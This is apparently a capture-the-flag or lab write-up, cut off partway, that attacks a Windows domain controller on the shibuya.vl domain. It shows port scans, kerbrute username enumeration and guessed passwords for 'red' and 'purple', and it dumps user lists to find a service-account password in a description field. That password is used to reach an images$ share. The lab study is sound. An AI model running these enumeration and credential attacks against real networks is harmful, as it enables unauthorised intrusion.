# Hostname setup
```python
sudo nxc smb 10.129.234.42 --generate-hosts-file /etc/hosts      
[sudo] password for kali: 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```
This has created me an entry in `/etc/hosts`

# Enuumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.234.42
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:13 +0000
Nmap scan report for 10.129.234.42
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50168/tcp open  unknown
50182/tcp open  unknown
50200/tcp open  unknown
50888/tcp open  unknown
51970/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds
```
Whats interesting here is that there is SSH (22) open
## Nmap
```python
nmap -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 -A --min-rate=2000 -sT AWSJPDC0522.shibuya.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:17 +0000
Nmap scan report for AWSJPDC0522.shibuya.vl (10.129.234.42)
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-21 17:17:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-21T17:03:50
|_Not valid after:  2027-03-21T17:03:50
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHIBUYA
|   NetBIOS_Domain_Name: SHIBUYA
|   NetBIOS_Computer_Name: AWSJPDC0522
|   DNS_Domain_Name: shibuya.vl
|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
|   DNS_Tree_Name: shibuya.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-21T17:17:55+00:00
|_ssl-date: 2026-03-21T17:18:35+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
| Not valid before: 2026-03-20T17:12:59
|_Not valid after:  2026-09-19T17:12:59
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Not a lot i can do with SSH until i get credentials

# SMB (445)
Null auth is enabled be default on domain controllers
Guest account is disabled

# Valid usernames found with kerbrute
```python
kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/21/26 - Ronnie Flathers @ropnop

2026/03/21 17:30:01 >  Using KDC(s):
2026/03/21 17:30:01 >  	AWSJPDC0522.shibuya.vl:88

2026/03/21 17:30:01 >  [+] VALID USERNAME:	 purple@shibuya.vl
2026/03/21 17:30:02 >  [+] VALID USERNAME:	 red@shibuya.vl
2026/03/21 17:30:14 >  [+] VALID USERNAME:	 Purple@shibuya.vl
2026/03/21 17:30:22 >  [+] VALID USERNAME:	 Red@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 RED@shibuya.vl
2026/03/21 17:30:38 >  [+] VALID USERNAME:	 PURPLE@shibuya.vl
```
Found two users `red` and `purple` neither are asrep roastable

I can try their username as their password

```python
nxc rdp AWSJPDC0522.shibuya.vl -u red -p 'red' -k 
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\red:red
```
I have successful as `red`

```python
nxc rdp AWSJPDC0522.shibuya.vl -u purple -p 'purple' -k
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\purple:purple
```
Also successful auth as `purple`

# SMB access as `red`
## Shares
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Enumerated shares
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Share           Permissions     Remark
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -----           -----------     ------
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      C$                              Default share
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      images$                         
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      users           READ 
```
## Users
```python
nxc smb AWSJPDC0522.shibuya.vl -u red$ -p 'red' -k --users-export users.txt
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0      
SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0 
```
I dumped the users there were 503 in total so i have not included them all in the output

Found what looks like a password in the user description

```python
svc_autojoin:K5&A6Dw9d8jrKWhV
```
Ill test these creds

# Compromising `svc_autojoin`

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV'  
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV
```
Successful authentication

```python
nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV' --shares               
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
```
This user has access to the `images$` share

```
smbclient \\\\AWSJPDC0522.shibuya.vl\\images$ -U 'svc_autojoin'%'K5&A6Dw9d8jrKWhV'                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 16 11:24:08 2025
  ..                                DHS        0  Wed Apr  9 01:09:45 2025
  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025

		5048575 blocks of size 4096. 1565210 blocks available
smb: \> 
```
Found some .wim files which ill transfer to my machine



